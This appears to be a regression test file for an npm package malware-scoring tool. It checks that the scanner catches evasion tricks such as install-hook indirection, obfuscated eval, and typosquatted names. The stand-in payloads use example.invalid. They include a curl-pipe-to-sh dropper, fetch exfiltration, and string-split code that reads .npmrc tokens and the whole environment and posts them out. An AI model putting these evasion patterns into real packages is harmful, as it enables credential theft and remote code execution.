// Regression tests for the score bug hunt (apm-score-v1 at 7f672da): each test is a way a malicious
// package used to keep a high score. Payloads are harmless stand-ins (fetch to example.invalid).
import { describe, expect, test } from "bun:test";
import { analyze, finalize, NOT_CHECKED, SCORE_FLOOR, typoConflicts, type Analysis, type TarEntry } from "../src/index.ts";

const FETCH = "fetch('https://example.invalid/c', { method: 'POST', body: 'x' });\n";
const DROPPER = "curl -s https://example.invalid/x.sh | sh";

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

type Pkg = { name?: string; manifest?: { scripts?: Record<string, string> }; files: Record<string, string>; maxScannedBytes?: number };

function analyzePkg(p: Pkg): Analysis {
  const name = p.name ?? "probe-pkg";
  const manifest = { name, version: "1.0.0", license: "MIT", main: "index.js", ...p.manifest };
  const files = [entry("package.json", JSON.stringify(manifest)), ...Object.entries(p.files).map(([path, text]) => entry(path, text))];

  return analyze({ name, manifest, files, publisher: "a", previousPublishers: [], maxScannedBytes: p.maxScannedBytes });
}

function ids(a: Analysis): string[] {
  return a.signals.map((s) => s.id);
}

function scoreOf(a: Analysis): number {
  return finalize(a, { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null }).score;
}

describe("1. NUL bytes", () => {
  test("a NUL byte in a non-code file reached by require does not hide its code", () => {
    const a = analyzePkg({ files: { "index.js": "module.exports = require('./lib/p.dat');\n", "lib/p.dat": `/*\0*/\n${FETCH}` } });
    expect(ids(a)).toContain("network");
  });

  test("a NUL byte at the start of the main file does not hide it", () => {
    const a = analyzePkg({ files: { "index.js": `\0${FETCH}` } });
    expect(ids(a)).toContain("network");
  });
});

describe("2. what is analyzed first, and what a cap does", () => {
  test("2000 filler code files do not push the install-script target out of the analysis", () => {
    const filler = Object.fromEntries(Array.from({ length: 2000 }, (_, i) => [`lib/f${i}.js`, "module.exports = 1;\n"]));
    const files = { "index.js": "module.exports = 1;\n", "setup.js": FETCH, ...filler };
    const a = analyzePkg({ manifest: { scripts: { postinstall: "node setup.js" } }, files });
    expect(ids(a)).toContain("network");
  });

  test("the byte budget reads install targets and entries first, and names what it left unread", () => {
    const filler = Object.fromEntries(Array.from({ length: 20 }, (_, i) => [`aaa/filler${i}.js`, `module.exports = ${"1".repeat(400)};\n`]));
    const files = { "index.js": "module.exports = 1;\n", "setup.js": FETCH, ...filler };
    const a = analyzePkg({ manifest: { scripts: { postinstall: "node setup.js" } }, files, maxScannedBytes: 2_000 });
    expect(ids(a)).toContain("network");
    expect(ids(a)).toContain("unanalyzed-files");
    expect(a.notChecked.join(" ")).toContain("not analyzed");
  });

  test("code that runs but did not fit the byte budget makes the analysis incomplete", () => {
    const a = analyzePkg({ files: { "index.js": `require('./big.js');\n`, "big.js": `module.exports = ${"1".repeat(5_000)};\n` }, maxScannedBytes: 2_000 });
    expect(ids(a)).toContain("incomplete");
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });
});

describe("3. files the require graph does not reach", () => {
  for (const [label, src] of [
    ["string concatenation", "module.exports = require('./lib/' + 'p.dat');\n"],
    ["a template literal", "const n = 'p.dat';\nmodule.exports = require(`./lib/${n}`);\n"],
    ["path.join(__dirname, ...)", "const p = require('path');\nmodule.exports = require(p.join(__dirname, 'lib', 'p.dat'));\n"],
  ] as const) {
    test(`a payload in a non-code file loaded through ${label} is analyzed`, () => {
      const a = analyzePkg({ files: { "index.js": src, "lib/p.dat": FETCH } });
      expect(ids(a)).toContain("network");
    });
  }

  test("a non-literal require argument in code that runs is its own signal", () => {
    const a = analyzePkg({ files: { "index.js": "const name = process.argv[2];\nmodule.exports = require(name);\n" } });
    expect(ids(a)).toContain("dynamic-require");
  });

  test("path.join(__dirname, ...) and require.resolve reach documentation-named files", () => {
    const viaJoin = analyzePkg({ files: { "index.js": "const path = require('path');\nrequire(path.join(__dirname, 'docs', 'notes.md'));\n", "docs/notes.md": FETCH } });
    expect(ids(viaJoin)).toContain("network");
    const viaResolve = analyzePkg({ files: { "index.js": "require(require.resolve('./docs/notes.md'));\n", "docs/notes.md": FETCH } });
    expect(ids(viaResolve)).toContain("network");
  });

  test("require probes .node and index.cjs the way node does", () => {
    const a = analyzePkg({ files: { "index.js": "require('./native');\nrequire('./lib');\n", "native.node": "\x7fELF....", "lib/index.cjs": FETCH } });
    expect(a.signals.find((s) => s.id === "binary")?.evidence).toContain("native.node");
    expect(ids(a)).toContain("network");
  });
});

describe("4. install-script indirection", () => {
  test("a script the install hook runs with npm run is analyzed as an install script", () => {
    const a = analyzePkg({ manifest: { scripts: { postinstall: "npm run build", build: DROPPER } }, files: { "index.js": "1;\n" } });
    expect(ids(a)).toContain("install-download");
  });

  test("yarn and pnpm script references are followed transitively", () => {
    const a = analyzePkg({ manifest: { scripts: { postinstall: "yarn setup", setup: "pnpm run fetchit", fetchit: DROPPER } }, files: { "index.js": "1;\n" } });
    expect(ids(a)).toContain("install-download");
  });

  test("sh -c '...' is unwrapped", () => {
    const a = analyzePkg({ manifest: { scripts: { postinstall: "sh -c 'npm run build'", build: DROPPER } }, files: { "index.js": "1;\n" } });
    expect(ids(a)).toContain("install-download");
  });

  test("a directly executed path is an install target", () => {
    const a = analyzePkg({ manifest: { scripts: { postinstall: "./setup" } }, files: { "index.js": "1;\n", setup: `#!/bin/sh\n${DROPPER}\n` } });
    expect(ids(a)).toContain("install-download");
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });

  test("a base64 payload in node -e is decoded and analyzed", () => {
    const b64 = Buffer.from(FETCH).toString("base64");
    const a = analyzePkg({ manifest: { scripts: { postinstall: `node -e "eval(Buffer.from('${b64}','base64').toString())"` } }, files: { "index.js": "1;\n" } });
    expect(ids(a)).toContain("install-download");
    expect(ids(a)).toContain("network");
  });

  test("npx in an install hook downloads and runs code", () => {
    const a = analyzePkg({ manifest: { scripts: { postinstall: "npx some-remote-tool --yes" } }, files: { "index.js": "1;\n" } });
    expect(ids(a)).toContain("install-download");
  });
});

describe("5. lifecycle scripts npm runs for git dependencies", () => {
  for (const hook of ["prepare", "prepack"]) {
    test(`${hook} with a download-and-run command scores below the floor`, () => {
      const a = analyzePkg({ manifest: { scripts: { [hook]: DROPPER } }, files: { "index.js": "1;\n" } });
      expect(ids(a)).toContain("git-install-script");
      expect(ids(a)).toContain("install-download");
      expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
    });
  }

  test("prepare that runs a build script through npm run is followed", () => {
    const a = analyzePkg({ manifest: { scripts: { prepare: "npm run build", build: DROPPER } }, files: { "index.js": "1;\n" } });
    expect(ids(a)).toContain("install-download");
  });

  test("an ordinary prepare (a compiler, husky) costs nothing", () => {
    const a = analyzePkg({ manifest: { scripts: { prepare: "husky install && npm run build", build: "tsc -p ." } }, files: { "index.js": "1;\n" } });
    expect(ids(a)).not.toContain("git-install-script");
    expect(scoreOf(a)).toBe(100);
  });

  test("prepublishOnly runs only on the publisher's machine but its shell use is still reported", () => {
    const a = analyzePkg({ manifest: { scripts: { prepublishOnly: DROPPER } }, files: { "index.js": "1;\n" } });
    expect(ids(a)).toContain("shell-exec");
  });
});

describe("6. binding.gyp", () => {
  test("a gyp action that downloads and runs code is an install download", () => {
    const gyp = JSON.stringify({ targets: [{ target_name: "x", actions: [{ action_name: "a", inputs: [], outputs: [], action: ["sh", "-c", DROPPER] }] }] });
    const a = analyzePkg({ files: { "index.js": "1;\n", "binding.gyp": gyp } });
    expect(ids(a)).toContain("install-download");
    expect(ids(a)).toContain("shell-exec");
  });

  test("a gyp command expansion <!(...) is analyzed", () => {
    const gyp = `{ 'targets': [ { 'target_name': 'x', 'sources': [ '<!(${DROPPER})' ] } ] }`;
    const a = analyzePkg({ files: { "index.js": "1;\n", "binding.gyp": gyp } });
    expect(ids(a)).toContain("install-download");
  });
});

describe("7. names built from strings, internal bindings and other doors", () => {
  test("string-concatenated module names, members and paths are joined before matching", () => {
    const src = [
      "const g = globalThis;",
      "const rq = g['re'+'qu'+'ire'];",
      "const cp = rq('chi'+'ld_'+'process');",
      "const fs = rq('f'+'s');",
      "const os = rq('o'+'s');",
      "const t = fs['rea'+'dFi'+'leSync'](os['hom'+'edi'+'r']()+'/.np'+'mrc','utf8');",
      "cp['exe'+'cSy'+'nc']('cu'+'rl -s https://example.invalid/x.sh');",
      "g['fe'+'tc'+'h']('https://example.invalid/c',{method:'POST',body:t});",
    ].join("\n");

    const a = analyzePkg({ files: { "index.js": src } });
    expect(ids(a)).toEqual(expect.arrayContaining(["shell-exec", "network", "credential-access"]));
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });

  test("process.binding reaches spawn without naming child_process", () => {
    const a = analyzePkg({ files: { "index.js": "const sb = process.binding('spawn_sync');\nsb.spawn({ file: '/bin/sh', args: ['/bin/sh', '-c', 'id'], envPairs: [] });\n" } });
    expect(ids(a)).toContain("shell-exec");
  });

  for (const [label, src] of [
    ["indirect eval", "const e = (0, eval); e('globalThis.x = 1');\n"],
    ["globalThis.eval", "globalThis.eval('globalThis.x = 1');\n"],
    ["constructor.constructor", "[].constructor.constructor('globalThis.x = 1')();\n"],
    ["Function without new", "const Fn = globalThis.Function; Fn('globalThis.x = 1')();\n"],
    ["string setTimeout", "setTimeout('globalThis.x = 1', 0);\n"],
    ["destructured vm", "const { runInThisContext } = require('vm'); runInThisContext('globalThis.x = 1');\n"],
  ] as const) {
    test(`eval through ${label} is reported`, () => {
      expect(ids(analyzePkg({ files: { "index.js": src } }))).toContain("eval");
    });
  }

  for (const [label, src] of [
    ["a concatenated module specifier", "const h = require('node:'+'ht'+'tp'); h['req'+'uest']('http://example.invalid');\n"],
    ["dns", "const d = require('node:dns'); d.resolve(process.env.USER + '.example.invalid', () => {});\n"],
    ["dns.promises", "const dns = require('dns'); dns.promises.resolve('example.invalid');\n"],
    ["navigator.sendBeacon", "navigator.sendBeacon('https://example.invalid/c', 'x');\n"],
    ["EventSource", "new EventSource('https://example.invalid/c');\n"],
    ["a dynamic import of http", "const m = await import('node:http'); m.request('http://example.invalid');\n"],
  ] as const) {
    test(`network through ${label} is reported`, () => {
      expect(ids(analyzePkg({ files: { "index.js": src } }))).toContain("network");
    });
  }

  for (const [label, src] of [
    ["a split .npmrc path", "require('fs').readFileSync(require('os').homedir() + '/.np' + 'mrc');\n"],
    ["a split token name", "const t = process.env['NPM' + '_TOKEN'];\n"],
    ["the whole environment sent over the network", "const all = Object.keys(process.env).map((k) => k + '=' + process.env[k]).join('&');\nfetch('https://example.invalid/c', { method: 'POST', body: all });\n"],
  ] as const) {
    test(`credential access through ${label} is reported`, () => {
      expect(ids(analyzePkg({ files: { "index.js": src } }))).toContain("credential-access");
    });
  }
});

describe("8. typosquats", () => {
  test("a popular name with a .js or js suffix is a lookalike", () => {
    for (const n of ["react.js", "expressjs", "lodash-js"]) expect(typoConflicts(n).length, n).toBeGreaterThan(0);
  });

  test("two edits away from a long popular name is a lookalike", () => {
    expect(typoConflicts("jsonwebtkn").map((c) => c.name)).toContain("jsonwebtoken");
    expect(typoConflicts("typscrip").map((c) => c.name)).toContain("typescript");
  });

  test("a scope one edit from a popular scope is a lookalike", () => {
    expect(typoConflicts("@type/node").map((c) => c.name)).toContain("@types/node");
    expect(typoConflicts("@babell/core").map((c) => c.name)).toContain("@babel/core");
  });

  test("a scoped name whose bare name is a typo of a popular package is a lookalike", () => {
    expect(typoConflicts("@evil/raect").map((c) => c.name)).toContain("react");
    expect(typoConflicts("@evil/expressjs").map((c) => c.name)).toContain("express");
  });

  test("real packages are not called typosquats", () => {
    for (const n of ["react", "zod", "hono", "next", "lodash.get", "lodash.debounce", "chart.js", "@types/node", "@types/react", "@sentry/react", "@sentry/node", "@nestjs/core", "@trpc/server", "@typescript-eslint/utils", "@tailwindcss/postcss", "webpack-cli", "js-cookie", "node-sass"]) {
      expect(typoConflicts(n), n).toEqual([]);
    }
  });
});

describe("9. obfuscation", () => {
  test("a short base64 payload decoded at runtime is analyzed and called obfuscated", () => {
    const a = analyzePkg({ files: { "index.js": `eval(atob('${Buffer.from(FETCH).toString("base64")}'));\n` } });
    expect(ids(a)).toEqual(expect.arrayContaining(["network", "obfuscated"]));
  });

  test("a name built from char codes is called obfuscated", () => {
    const a = analyzePkg({ files: { "index.js": "const a = [102, 101, 116, 99, 104];\nglobalThis[String.fromCharCode(...a)]('https://example.invalid/c');\n" } });
    expect(ids(a)).toEqual(expect.arrayContaining(["network", "obfuscated"]));
  });

  test("hex escapes that spell a module name are decoded", () => {
    const a = analyzePkg({ files: { "index.js": "require('\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73').execSync('id');\n" } });
    expect(ids(a)).toEqual(expect.arrayContaining(["shell-exec", "obfuscated"]));
  });

  test("an inline source map or data URI is not obfuscation", () => {
    const map = Buffer.from(JSON.stringify({ version: 3, mappings: "AAAA".repeat(2000) })).toString("base64");
    const a = analyzePkg({ files: { "index.js": `module.exports = 1;\n//# sourceMappingURL=data:application/json;base64,${map}\n` } });
    expect(ids(a)).not.toContain("obfuscated");
  });
});

describe("what the score says it did not check", () => {
  test("NOT_CHECKED names the gaps the static analysis leaves open", () => {
    const text = NOT_CHECKED.join("\n");
    expect(text).toContain("runtime");
    expect(text).toMatch(/encod/i);
  });
});
